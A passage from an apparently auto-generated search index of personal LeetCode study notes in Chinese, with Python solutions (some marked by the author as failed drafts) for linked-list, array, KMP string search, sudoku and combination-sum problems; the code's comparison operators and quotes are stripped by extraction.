ListNode ( HEAD ) p = head pLists = [ listnode for listnode in lists ] while haveSth ( pLists ): currentMin = ListNode ( float ( inf )) currentMin_index = 0 for i in range ( len ( pLists )): if pLists [ i ] is not None : if pLists [ i ] . val currentMin . val : currentMin = pLists [ i ] currentMin_index = i # break p . next = currentMin p = p . next if pLists [ currentMin_index ]: pLists [ currentMin_index ] = pLists [ currentMin_index ] . next return head . next \u8be5\u7b97\u6cd5\u7528\u4e869000\u591ams\uff0c\u90a3\u4e48\u9700\u8981\u629b\u5f03\u6216\u8005\u4f18\u5316 \u5176\u5b9e\u53ea\u9700\u8981\u53d6\u4e2a\u6700\u5c0f\u503c\uff0c\u6240\u4ee5\uff0c\u5c0f\u6839\u5806\uff1f","title":"023"},{"location":"LeetCode/vol 0/021-030/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import heapq class Solution : def mergeKLists ( self , lists ): :type lists: List[ListNode] :rtype: ListNode heap = [] for l in lists : if l != None : heap . append (( l . val , l )) heapq . heapify ( heap ) dummy = ListNode ( 0 ) cur = dummy while heap : _ , h = heapq . heappop ( heap ) cur . next = h cur = cur . next if h . next : heapq . heappush ( heap , ( h . next . val , h . next )) return dummy . next \u4f46\u662f\u7528\u4e86import\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5df1\u5199\u4e2a\u5c0f\u6839\u5806\uff0c\u6216\u662f\u81ea\u5df1\u8bfbheapq","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/021-030/#024","text":"\u4ea4\u6362\u94fe\u8868\u7684\u76f8\u90bb\u7684\u4e24\u4e2a\u8282\u70b9 1 Given 1- 2- 3- 4, you should return the list as 2- 1- 4- 3. \u76f4\u63a5\u66b4\u529b\u4e86","title":"024"},{"location":"LeetCode/vol 0/021-030/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def swapPairs ( self , head ): :type head: ListNode :rtype: ListNode HEAD = ListNode ( HEAD ) HEAD . next = head p = HEAD while p != None : left = p . next if p . next else False right = p . next . next if p . next else False if left and right : left . next = right . next if right . next else None right . next = left p . next = right p = p . next . next else : break return HEAD . next 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def swapPairs ( self , head ): :type head: ListNode :rtype: ListNode if not head : return None newHead = head . next if head . next else head curr = head prev = None while curr and curr . next : temp = curr . next curr . next = curr . next . next temp . next = curr if prev : prev . next = temp prev = curr curr = curr . next return newHead","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/021-030/#025","text":"024\u662f\u4ea4\u6362\u4e24\u4e2a\u76f8\u90bb\u7684\u8282\u70b9\uff0c025\u662f\u7ffb\u8f6c\u8fde\u7eed\u7684n\u4e2a\u8282\u70b9 1 2 3 4 Given this linked list: 1- 2- 3- 4- 5 For k = 2, you should return: 2- 1- 4- 3- 5 For k = 3, you should return: 3- 2- 1- 4- 5 \u60f3\u6cd5 \u7528n\u6765\u63a7\u5236\u5faa\u73af\u6df1\u5ea6 \u5b9e\u73b0\u94fe\u8868\u7684\u7ffb\u8f6c\uff1f \u5efa\u7acb\u4e00\u4e2a\u5faa\u73af\uff0c\u540e\u79fb\u4f4dn\u4e2a\u8282\u70b9\uff0c\u5982\u679c\u5b58\u5728\u9700\u8981\u53cd\u8f6c\uff0c\u5e76\u8bb0\u5f55\u8282\u70b9\u4f4d\u7f6e \u4e00\u5f00\u59cb\u5199\u7684\u662f\u5de6\u95ed\u53f3\u5f00\u7684\uff0c\u5982\u4e0b\uff0c\u5f53head\u4e3a0\uff0cend\u4e3a2\u65f6\uff0c\u53cd\u8f6c\u8282\u70b90\u548c1 1 2 0 - 1 - 2 h e \u4f46\u662f\u51fa\u9519\u4e86\uff0c\u6ca1\u8003\u8651\u597d\u3002\u5904\u4e8e\u4e0b\u9762\u60c5\u51b5\u65f6\uff0c\u4e00\u5f00\u59cb\u7684\u7b97\u6cd5\u5c31\u76f4\u63a5\u8df3\u51fa\u5faa\u73af\u4e86\uff0c\u4f46\u662f\u8fd8\u662f\u9700\u8981\u53cd\u8f6c\u7684 1 2 0 - 1 - None h e \u6240\u4ee5\u9700\u8981\u91cd\u65b0\u5199\u4e2a\uff0c\u6216\u8005\u662f\u6211\u7684\u7b97\u6cd5\u51fa\u9519\u4e86 \u6700\u540e\u8fd8\u662f\u7b97\u6cd5\u51fa\u9519\u4e86","title":"025"},{"location":"LeetCode/vol 0/021-030/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Solution : def reverse ( self , headNode , endNode ): prev = endNode p = headNode while p != endNode : tmp = p . next p . next = prev prev = p p = tmp return prev def reverseKGroup ( self , head , k ): :type head: ListNode :type k: int :rtype: ListNode p = head for i in range ( k ): if not p : return head p = p . next newHead = reverse ( head , p ) head . next = self . reverseKGroup ( p , k ) return newHead","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/021-030/#_6","text":"Todo \u6539\u9519 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 class Solution : def reverse ( self , headNode , endNode ): TMPHEAD = ListNode ( HEAD ) TMPHEAD . next = endNode p = headNode while p != endNode : currentNode = p p = p . next currentNode . next = TMPHEAD . next TMPHEAD . next = currentNode return TMPHEAD . next def getKthNode ( self , head , k ): p = head for _ in range ( k ): p = p . next if p is None : break return p def reverseKGroup ( self , head , k ): :type head: ListNode :type k: int :rtype: ListNode if not head or head . val == None : return HEAD = ListNode ( HEAD ) HEAD . next = head link = HEAD p = head endNode = self . getKthNode ( p , k ) while p and endNode : headNode = self . reverse ( p , endNode ) p = p . next endNode = self . getKthNode ( p , k ) link . next = headNode link = self . getKthNode ( link , k ) return HEAD . next \u4ee3\u7801\u81c3\u80bf\uff0c\u6839\u636e\u4e4b\u524d\u7684\u53d8\u5316\u6539\u52a8\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 class Solution : def reverse ( self , headNode , endNode ): TMPHEAD = ListNode ( HEAD ) TMPHEAD . next = endNode p = headNode while p != endNode : currentNode = p p = p . next currentNode . next = TMPHEAD . next TMPHEAD . next = currentNode return TMPHEAD . next def reverseKGroup ( self , head , k ): :type head: ListNode :type k: int :rtype: ListNode p = head for i in range ( k ): if p is None : return head p = p . next newHead = self . reverse ( head , p ) head . next = self . reverseKGroup ( p , k ) return newHead \u603b\u7ed3 \u94fe\u8868\u53cd\u8f6c\u8fd8\u662f\u4e0d\u6e05\u6670\uff0c\u867d\u7136\u601d\u8def\u4e00\u6837\u4f46\u8fd8\u662f\u82b1\u4e86\u70b9\u65f6\u95f4\u91cd\u65b0\u7406\u89e3 \u5fd8\u8bb0\u4f7f\u7528\u9012\u5f52","title":"\u9519\u8bef\u4ee3\u7801"},{"location":"LeetCode/vol 0/021-030/#026","text":"\u7ed9\u5b9a\u4e00\u4e2a \u6392\u597d\u5e8f \u7684\u6570\u7ec4\uff0c\u5220\u9664\u91cd\u590d\u9879\uff0c\u7ed9\u51fa\u5220\u9664\u91cd\u590d\u9879\u540e\u7684\u957f\u5ea6 \u8981\u6c42\uff0c\u989d\u5916\u7684O(1)\u5185\u5b58 \u5751 \u4e3a\u4ec0\u4e48\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6574\u6570\u4f46\u4f60\u7684\u7b54\u6848\u662f\u4e00\u4e2a\u6570\u7ec4\uff1f \u8bf7\u6ce8\u610f\uff0c\u8f93\u5165\u6570\u7ec4\u662f\u901a\u8fc7\u5f15\u7528\u4f20\u5165\u7684\uff0c\u8fd9\u610f\u5473\u7740\u8c03\u7528\u8005\u4e5f\u53ef\u4ee5\u77e5\u9053\u5bf9\u8f93\u5165\u6570\u7ec4\u7684\u4fee\u6539\u3002 \u4f7f\u7528\u8fd4\u56de\u7684\u957f\u5ea6\uff0c\u8fd9\u56de\u6253\u5370\u51fa\u7b2c\u4e00\u4e2a\u7b2ci\u5927\u7684\u503c \u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u662f\u8fd4\u56de\u4e00\u4e2a\u6570\uff0c\u662f\u5bf9\u8fd9\u4e2a\u6570\u7ec4\u8fdb\u884c\u64cd\u4f5c\uff0c\u540c\u65f6\uff0c\u4e0d\u80fd\u4f7f\u7528\u4e00\u4e2a\u989d\u5916\u6570\u7ec4\u6765\u653e\u7f6e\u6570 \u60f3\u6cd5 \u66b4\u529b\u904d\u5386\u8bd5\u8bd5","title":"026"},{"location":"LeetCode/vol 0/021-030/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def removeDuplicates ( self , nums ): :type nums: List[int] :rtype: int if len ( nums ) = 1 : return len ( nums ) i = 1 while i len ( nums ): if nums [ i ] == nums [ i - 1 ]: del ( nums [ i ]) else : i += 1 return len ( nums ) \u8fd9\u91cc\u7528\u4e86python\u672c\u8eab\u7684\u51fd\u6570 \u90a3\u4e48\u7528\u4e00\u4e2a\u53d8\u91cf\u8bb0\u5f55\u5206\u914d\u597d\u7684index\uff1f","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/021-030/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def removeDuplicates ( self , nums ): :type nums: List[int] :rtype: int if len ( nums ) = 1 : return len ( nums ) index = 1 for i in range ( 1 , len ( nums )): if nums [ i ] nums [ i - 1 ]: nums [ index ] = nums [ i ] index += 1 # del(nums[index:]) return index","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 0/021-030/#027","text":"\u7ed9\u5b9a\u4ee5\u4e2a\u6570\u7ec4nums\u548c\u6570\u5b57val\uff0c\u5c06nums\u5185\u7684\u6240\u6709\u503c\u4e3aval\u7684\u5b9e\u4f8b\u5220\u9664\u6389 \u8981\u6c42\u4e0e026\u7684\u4e00\u6837","title":"027"},{"location":"LeetCode/vol 0/021-030/#_9","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution ( object ): def removeElement ( self , nums , val ): :type nums: List[int] :type val: int :rtype: int # start, end = 0, len(nums) - 1 # while start = end: # if nums[start] == val: # nums[start], nums[end], end = nums[end], nums[start], end - 1 # else: # start += 1 # return start begin = 0 for i in range ( len ( nums )): if nums [ i ] != val : nums [ begin ] = nums [ i ] begin += 1 return begin","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/021-030/#028","text":"\u5b9e\u73b0\u51fd\u6570\u6765\u5f97\u5230\u5b50\u5b57\u7b26\u4e32\u5728\u5b57\u7b26\u4e32\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e 1 2 3 4 5 Input: haystack = hello , needle = ll Output: 2 Input: haystack = aaaaa , needle = bba Output: -1 \u60f3\u6cd5 \u6211\u600e\u4e48\u611f\u89c9\u548c026\uff0c027\u7684\u9898\u76ee\u5dee\u4e0d\u591a \u4ec0\u4e48\u9898\u5148\u66b4\u529b\u8bd5\u8bd5 \u4e00\u5f00\u59cb\u7684\u66b4\u529b\u601d\u8def\u51fa\u9519\u4e86\uff0c\u5f53\u78b0\u5230\u4e0b\u9762\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u65f6\u5019\u5c31\u51fa\u9519\u4e86 \u4e00\u5f00\u59cb\u7684\u66b4\u529b\u601d\u8def\u662f\u5728haystack\u627eneedle[0]\u7684\u5b57\u7b26\uff0c\u7136\u540e\u9010\u4e2a\u68c0\u67e5\uff0c\u4f46\u662f\u6ca1\u6709\u8003\u8651\u7c7b\u4f3c\u4e0b\u9762\u53ef\u80fd\u6709\u516c\u5171\u5f00\u5934\u5b57\u7b26\u4e32\u7684\u60c5\u51b5 1 2 mississippi issipi \u90a3\u4e48\u52bf\u5fc5\u8981\u6362\u4e2a\u66b4\u529b\u601d\u8def\uff0c\u6bd4\u5982\u66f4\u539f\u59cb\u7684\u65b9\u5f0f\uff0c\u4f46\u662f\u8fd9\u6837\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u592a\u9ad8\u4e86 \u90a3\u4e48\u80fd\u5426\u4e0aDP\u5462\uff1f \u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4dp[i][j]\uff1f\u8868\u793ahaystack[i]\u4e2dneedle[j]\u7684\u51fa\u73b0\u7684\u4f4d\u7f6e\uff1f \u90a3\u4e48\u5982\u4f55\u8fed\u4ee3\u5462\uff0c\u521d\u59cb\u72b6\u6001\uff1f \u4e0d\u5bf9\u3002\u3002\u3002\u5e94\u8be5\u662fKMP","title":"028"},{"location":"LeetCode/vol 0/021-030/#_10","text":"IMPORTANT \u660e\u663e\u7684KMP\u7b97\u6cd5 \u4f46\u662f\u6211\u5fd8\u4e86 \u5173\u952e\u662f\u5efa\u8bae\u4e00\u4e2anext\u6570\u7ec4\uff08\u8fd9\u91cc\u7528rollback\uff09\u4ee3\u66ff \u8be6\u60c5\u770b\u6ce8\u91ca 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 class Solution : def strStr ( self , haystack : str , needle : str ) - int : if len ( needle ) == 0 : return 0 res = - 1 # \u65f6\u95f4\u590d\u6742\u5ea6 n^2 # for i in range(len(haystack)): # j = 0 # while j len(needle) and i len(haystack) and haystack[i] == needle[j]: # i += 1 # j += 1 # if j == len(needle): # return i-len(needle) # return res # KMP\u7b97\u6cd5\u5230\u5e95\u600e\u4e48\u5b9e\u73b0\u6765\u7740 # \u8bb0\u5f55\u4e00\u4e2a\u6570\u7ec4\uff0c\u9632\u6b62\u91cd\u590d\u5224\u65ad # \u90a3\u4e2a\u6570\u7ec4\u600e\u4e48\u5efa\u7acb\u6765\u7740\uff1f # abcdabeab #-100012012 rollback = [ 0 for i in range ( len ( needle ))] rollback [ 0 ] = - 1 i , j = 0 , - 1 while i len ( needle ) - 1 : if j ==- 1 or needle [ i ] == needle [ j ]: i += 1 j += 1 rollback [ i ] = j else : j = rollback [ j ] i = j = 0 while i len ( haystack ): # roll-back while j = 0 and needle [ j ] != haystack [ i ]: j = rollback [ j ] i , j = i + 1 , j + 1 if j == len ( needle ): return i - len ( needle ) return - 1","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/021-030/#029","text":"Todo \u7ed9\u5b9a\u4e24\u4e2a\u6574\u6570\u9664\u6570\u4e0e\u4f59\u6570\uff0c\u8fdb\u884c\u9664\u6cd5\u800c\u4e0d\u4f7f\u7528 / , * , % \u901a\u8fc7\u79fb\u4f4d\u6765\u505a\uff1f","title":"029"},{"location":"LeetCode/vol 0/021-030/#030","text":"Todo \u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5728\u8fd9\u5b57\u7b26\u4e32\u4e2d\u67e5\u627e \u4e00\u4e2a\u7531\u76f8\u540c\u957f\u5ea6\u5b57\u7b26\u4e32\u6784\u6210\u7684\u5217\u8868 \u7684\u6240\u6709\u5bf9\u5e94\u6210\u5458\u7684\u5728\u6bcd\u5b57\u7b26\u4e32\u7684\u7d22\u5f15","title":"030"},{"location":"LeetCode/vol 0/031-040/","text":"031 Todo \u5b9e\u73b0\u4e00\u4e2a\u6c42\u89e3\u6570\u7ec4\u4e0b\u4e00\u4e2a\u5168\u6392\u5217\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5c31\u5c3d\u53ef\u80fd\u5347\u5e8f\u6392\u5e8f \u4f7f\u7528\u6052\u5b9a\u7684\u989d\u5916\u5185\u5b58 1 2 3 1 , 2 , 3 \u2192 1 , 3 , 2 3 , 2 , 1 \u2192 1 , 2 , 3 1 , 1 , 5 \u2192 1 , 5 , 1 \u60f3\u6cd5 \u56de\u6eaf\uff1f \u9012\u5f52\uff1f \u770b\u4e86\u4e0b\u5176\u4ed6\u89e3\u6cd5\uff0c\u53d1\u73b0\u4f7f\u7528\u4e86\u662f\u5426\u9012\u589e\uff0c\u901a\u8fc7\u662f\u5426\u9012\u589e\u6765\u5224\u5b9a\u662f\u5426\u662f\u5168\u6392\u5217 035 \u7ed9\u5b9a\u4e00\u4e2a\u6392\u5e8f\u6570\u7ec4nums\u548c\u4e00\u4e2a\u6570val\uff0c\u5982\u679cval\u5728nums\u91cc\uff0c\u8fd4\u56de\u7d22\u5f15\uff1b\u5426\u5219\uff0c\u8fd4\u56de\u5e94\u8be5\u63d2\u5165\u7684\u4f4d\u7f6e\u7684\u7d22\u5f15 \u6cd5\u4e00 \u4e8c\u5206\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def searchInsert ( self , nums , target ): :type nums: List[int] :type target: int :rtype: int left = 0 right = len ( nums ) - 1 while left right : middle = ( right + left ) // 2 # middle = left + (right - left) // 2 if nums [ middle ] == target : return middle elif nums [ middle ] target : left = middle + 1 else : right = middle - 1 if target = nums [ left ]: return left else : return right + 1 036 \u5224\u5b9a\u4e00\u4e2a9*9\u7684\u6570\u72ec\u677f\u662f\u5426\u6709\u6548 \u6bcf\u6a2a\uff0c\u6bcf\u5217\uff0c\u6bcf3*3\u7684\u683c\u5b50\u5185\u90fd\u67091-9\u4e14\u4e0d\u91cd\u590d \u60f3\u6cd5 \u96be\u9053\u8981\u66b4\u529b\u904d\u5386\uff1f \u4e0d\u8fc7\u8fd9\u662f\u4e2d\u7b49\u9898\u3002\u3002\u3002\u3002emmmmm \u5bf9\u4e8e\u683c\u5b50\u6709 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 0 0,0 0,1 0,2 1,0 1,1 1,2 2,0 2,1 2,2 1 0,3 0,4 0,5 1,3 1,4 1,5 2,3 2,4 2,5 2 0,6 0,7 0,8 1,6 1,7 1,8 2,6 2,7 2,8 3 3,0 3,1 3,2 4,0 4,1 4,2 5,0 5,1 5,2 \u6cd5\u4e00 \u66b4\u529b\u904d\u5386 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 class Solution : def isValidSudoku ( self , board ): :type board: List[List[str]] :rtype: bool for i in range ( 9 ): newList = [] for j in range ( 9 ): if board [ i ][ j ] != . : if board [ i ][ j ] in newList : return False else : newList . append ( board [ i ][ j ]) for j in range ( 9 ): newList = [] for i in range ( 9 ): if board [ i ][ j ] != . : if board [ i ][ j ] in newList : return False else : newList . append ( board [ i ][ j ]) for i in range ( 0 , 9 , 3 ): for j in range ( 0 , 9 , 3 ): newList = [] for newI in range ( 3 ): for newJ in range ( 3 ): if board [ i + newI ][ j + newJ ] != . : if board [ i + newI ][ j + newJ ] in newList : return False else : newList . append ( board [ i + newI ][ j + newJ ]) return True print ( Solution () . isValidSudoku ([ [ 5 , 3 , . , . , 7 , . , . , . , . ], [ 6 , . , . , 1 , 9 , 5 , . , . , . ], [ . , 9 , 8 , . , . , . , . , 6 , . ], [ 8 , . , . , . , 6 , . , . , . , 3 ], [ 4 , . , . , 8 , . , 3 , . , . , 1 ], [ 7 , . , . , . , 2 , . , . , . , 6 ], [ . , 6 , . , . , . , . , 2 , 8 , . ], [ . , . , . , 4 , 1 , 9 , . , . , 5 ], [ . , . , . , . , 8 , . , . , 7 , 9 ] ])) \u6cd5\u4e8c \u4ee3\u7801\u4f18\u96c5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def isValidSudoku ( self , board ): :type board: List[List[str]] :rtype: bool seen = set () for i in range ( 0 , 9 ): for j in range ( 0 , 9 ): elem = board [ i ][ j ] if ( elem != . ): if (( i , elem ) in seen or ( elem , j ) in seen or ( i // 3 , j // 3 , elem ) in seen ): return False seen . add (( i , elem )) seen . add (( elem , j )) seen . add (( i // 3 , j // 3 , elem )) return True 037 \u6570\u72ec\u6c42\u89e3\u5668 \u60f3\u6cd5 \u66b4\u529b DP \u56de\u6eaf \u9996\u5148\u662f\u66b4\u529b \u73b0\u7528python\u672c\u8eab\u7684\u51fd\u6570\u6765\u66b4\u529b\u4e00\u4e0b \u5988\u7684\u66b4\u529b\u66b4\u529b\u5c31\u6210\u56de\u6eaf\u4e86\u3002\u3002\u3002 \u6cd5\u4e00 \u6839\u636e\u53c2\u8003\u8d44\u6599\uff0c\u8fd8\u662f\u56de\u6eaf\u6cd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 class Solution : def solveSudoku ( self , board ): :type board: List[List[str]] :rtype: void Do not return anything, modify board in-place instead. rows = [ set () for i in range ( 9 )] cols = [ set () for i in range ( 9 )] boxes = [ set () for i in range ( 9 )] empty = set () for i in range ( 9 ): for j in range ( 9 ): if board [ i ][ j ] == . : empty . add (( i , j )) continue n = board [ i ][ j ] #if n in rows[i] or n in cols[j] or n in boxes[(i//3)*3 + j//3] # return False rows [ i ] . add ( n ) cols [ j ] . add ( n ) boxes [( i // 3 ) * 3 + j // 3 ] . add ( n ) num = set ( 123456789 ) rows = [ num - row for row in rows ] cols = [ num - col for col in cols ] boxes = [ num - box for box in boxes ] result = self . DFS ( board , empty , rows , cols , boxes ) def DFS ( self , board , empty , rows , cols , boxes ): if len ( empty ) == 0 : return True maxpossible = 9 for r , c in empty : possible = rows [ r ] cols [ c ] boxes [( r // 3 ) * 3 + c // 3 ] if len ( possible ) maxpossible : maxpossible = len ( possible ) i , j = r , c if maxpossible == 0 : return False possible = rows [ i ] cols [ j ] boxes [( i // 3 ) * 3 + j // 3 ] empty . remove (( i , j )) for opt in possible : rows [ i ] . discard ( opt ) cols [ j ] . discard ( opt ) boxes [( i // 3 ) * 3 + j // 3 ] . discard ( opt ) board [ i ][ j ] = opt if self . DFS ( board , empty , rows , cols , boxes ): return True board [ i ][ j ] = . rows [ i ] . add ( opt ) cols [ j ] . add ( opt ) boxes [( i // 3 ) * 3 + j // 3 ] . add ( opt ) empty . add (( i , j )) return False \u5176\u4ed6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 class Solution : def solveSudoku ( self , board ): self . board = board self . solve () def solve ( self ): # \u4e3b\u9012\u5f52\u51fd\u6570 row , col = self . findUnassigned () # \u83b7\u53d6\u4e00\u4e2a\u672a\u88ab\u5206\u914d\u7684\u65b9\u683c if row == - 1 and col == - 1 : # \u6ca1\u6709\u627e\u5230\uff0c\u8bf4\u660e\u5df2\u7ecf\u586b\u597d return True for num in [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 ]: if self . isSafe ( row , col , num ): # \u5faa\u73af\u586b\u5165\u6570\u5b57\uff0c\u5e76\u5224\u65ad\u662f\u5426\u6ee1\u8db3\u8981\u6c42 self . board [ row ][ col ] = num if self . solve (): # \u9012\u5f52\u8fdb\u5165\u4e0b\u4e00\u4e2a\u65b9\u683c return True self . board [ row ][ col ] = . # \u540e\u7eed\u4e0d\u6ee1\u8db3\uff0c\u90a3\u4e48\u73b0\u5728\u8981\u56de\u590d\u5f53\u524d\u73af\u5883\uff0c\u5e76\u8fdb\u884c\u4e0b\u4e00\u4e2a\u6570\u5b57\u8bd5\u63a2 return False def findUnassigned ( self ): # \u4f9d\u6b21\u67e5\u627e\u672a\u88ab\u5206\u914d\u7684\u65b9\u683c for row in range ( 9 ): for col in range ( 9 ): if self . board [ row ][ col ] == . : return row , col return - 1 , - 1 def isSafe ( self , row , col , ch ): # \u5224\u65ad\u662f\u5426\u5f53\u524d\u65b9\u683c\u586b\u5165\u7684\u6570\u5b57\u662f\u5426\u6ee1\u8db3\u8981\u6c42 boxrow = row - row % 3 # \u786e\u5b9a3x3\u5c0f\u5bab\u683c\u7684\u5f00\u59cb\u5750\u6807\uff0c\u5c31\u662f3x3\u5c0f\u5bab\u683c\u7b2c\u4e00\u4e2a\u65b9\u683c\u7d22\u5f15 boxcol = col - col % 3 if self . checkrow ( row , ch ) and self . checkcol ( col , ch ) and self . checksquare ( boxrow , boxcol , ch ): return True return False def checkrow ( self , row , ch ): # \u68c0\u67e5\u4e00\u884c\u662f\u5426\u7b26\u5408\u6761\u4ef6 for col in range ( 9 ): if self . board [ row ][ col ] == ch : return False return True def checkcol ( self , col , ch ): # \u68c0\u67e5\u4e00\u5217\u662f\u5426\u7b26\u5408\u6761\u4ef6 for row in range ( 9 ): if self . board [ row ][ col ] == ch : return False return True def checksquare ( self , row , col , ch ): # \u68c0\u67e53x3\u5c0f\u5bab\u683c\u662f\u5426\u7b26\u5408\u6761\u4ef6 for r in range ( row , row + 3 ): for c in range ( col , col + 3 ): if self . board [ r ][ c ] == ch : return False return True 038 \u6570\u6570\u4e0e\u8bf4\uff0c\u9996\u5148\u7ed9\u51fa5\u4e2a\u6570\uff08hash\u5e8f\u5217\uff1f\u8fd8\u662f\u627e\u89c4\u5f8b\uff1f\uff09\uff0c\u7136\u540e\u7ed9\u5b9a\u4e00\u4e2a1\u523030\u7684\u6570n\uff0c\u8f93\u51fa\u5bf9\u5e94\u7684\u5e8f\u5217 1 2 3 4 5 1. 1 2. 11 # \u4e00\u4e2a1 3. 21 # \u4e24\u4e2a1 4. 1211 # \u4e00\u4e2a2\u4e24\u4e2a1 5. 111221 # \u4e00\u4e2a1\u4e00\u4e2a2\u4e24\u4e2a1 \u6839\u636e\u53c2\u8003\u8d44\u6599\u7684\u8bf4\u660e\uff0c\u5f97\u5230\u9898\u610f \u60f3\u6cd5 \u90a3\u4e48\u5c31\u662f\u9700\u8981\u9012\u5f52\u4e86\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def countAndSay ( self , n ): :type n: int :rtype: str if n == 1 : return 1 # elif n == 2: # return 11 else : # \u589e\u52a0\u672b\u5c3e\u6807\u8bb0\u7b26\u53f7\uff0c\u6807\u8bc6\u672b\u5c3e lastString = self . countAndSay ( n - 1 ) + * res = count = 1 for i in range ( len ( lastString ) - 1 ): if lastString [ i ] == lastString [ i + 1 ]: count += 1 else : res = res + str ( count ) + lastString [ i ] count = 1 return res 039 Todo \u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4nums\u548c\u4e00\u4e2a\u6570target\uff0c\u4ece\u6570\u7ec4\u4e2d\u51d1\u6570\u5b57\u4f7f\u5f97\u548c\u4e3atarget\uff0c\u5176\u4e2d\uff0cnums\u7684\u6570\u5b57\u53ef\u4ee5\u91cd\u590d 1 2 3 4 5 6 Input: candidates = [2,3,6,7], target = 7, A solution set is: [ [7], [2,2,3] ] \u60f3\u6cd5 \u4f7f\u7528dic\u6765\u8bb0\u5f55\uff1fdic[i]=set(list1,list2)=== dic[target]=set(list1,list2) \u8fd9\u79cd\u60f3\u6cd5\u9519\u8bef\uff0cset\u4e0d\u80fd\u4ee5list\u521d\u59cb\u5316\uff0clist\u4e0d\u53efhash \u90a3\u4e48\u53ea\u80fd\u8fd9\u6837\u4f7f\u7528:dic[i]=[sorted(list1),sorted(list2), ] \u5199\u662f\u53ef\u4ee5\uff0c\u4f46\u662f\u4f18\u5316\u4f59\u5730\u7279\u522b\u5927 \u90a3\u4e48\u8fd9\u6837\u904d\u5386\u7684\u601d\u60f3\u662f\u4e0d\u884c\u7684 \u6240\u4ee5\uff0c\u4f7f\u7528\u56de\u6eaf\uff0c\u6216\u8005\u9012\u5f52 \u5bf9\u4e8e\u9012\u5f52\u6765\u8bf4\uff0c\u7ec8\u6b62\u60c5\u51b5\u662f\uff0cdiff=target-num=0\uff1b\u6f14\u8fdb\u8fc7\u7a0b\u662f\uff0c\u4e0d\u65ad\u5bf9diff\u67e5\u627e\uff0c\u627e\u5230diff\u6240\u5c5e\u7684\u7b54\u6848\u540e\u5c06\u5176append \u8349\u7a3f \u5931\u8d25\uff0c\u4ee5\u540e\u518d\u8bf4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def combinationSum ( self , candidates , target ): result = [] candidates = sorted ( candidates ) def combinationSum_helper ( diff , result_tmp ): if diff == 0 : result . append ( result_tmp ) for candidate in candidates : if candidate diff : break if candidates result_tmp [ - 1 ]: continue else : combinationSum_helper ( diff - candidate , result_tmp + [ candidates ]) combinationSum_helper ( target ,[]) return result \u5176\u4ed6 \u4f7f\u7528\u6df1\u5ea6\u641c\u7d22 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def combinationSum ( self , candidates , target ): result = [] candidates = sorted ( candidates ) def dfs ( remain , stack ): if remain == 0 : result . append ( stack ) return for item in candidates : if item remain : break # todo make the line clean if stack and item stack [ - 1 ]: continue else : dfs ( remain - item , stack + [ item ]) dfs ( target , []) return result","title":"031 040"},{"location":"LeetCode/vol 0/031-040/#031","text":"Todo \u5b9e\u73b0\u4e00\u4e2a\u6c42\u89e3\u6570\u7ec4\u4e0b\u4e00\u4e2a\u5168\u6392\u5217\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5c31\u5c3d\u53ef\u80fd\u5347\u5e8f\u6392\u5e8f \u4f7f\u7528\u6052\u5b9a\u7684\u989d\u5916\u5185\u5b58 1 2 3 1 , 2 , 3 \u2192 1 , 3 , 2 3 , 2 , 1 \u2192 1 , 2 , 3 1 , 1 , 5 \u2192 1 , 5 , 1 